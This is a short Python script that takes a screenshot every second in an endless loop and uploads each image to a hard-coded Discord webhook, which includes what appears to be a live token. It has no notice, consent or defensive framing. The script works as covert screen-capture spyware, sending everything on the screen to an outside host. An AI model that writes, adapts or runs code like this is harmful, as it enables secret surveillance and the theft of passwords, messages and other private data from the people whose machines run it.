import time
import pyscreenshot as ImageGrab
from discord_webhook import DiscordWebhook

def take_screenshot_and_send():
    # Take screenshot
    screenshot = ImageGrab.grab()

    # Save the screenshot as a file
    screenshot.save('screenshot.png')

    # Set your Discord webhook URL
    webhook_url = 'https://discord.com/api/webhooks/1180052528352739409/g4q0iHWTeKSoHOeK2okdtGT7CaT5-x7lIKx9zF5kqQQVPuVLEAOaXB_2FA640DfSrBTo'

    # Create a DiscordWebhook instance
    webhook = DiscordWebhook(url=webhook_url)

    # Add the screenshot file to the webhook
    webhook.add_file(file=open('screenshot.png', 'rb'), filename='screenshot.png')

    # Execute the webhook
    webhook.execute()
    
    
while True:
    if __name__ == "__main__":
        take_screenshot_and_send()
        # Set the time interval for taking screenshots (in seconds)
        time.sleep(1)
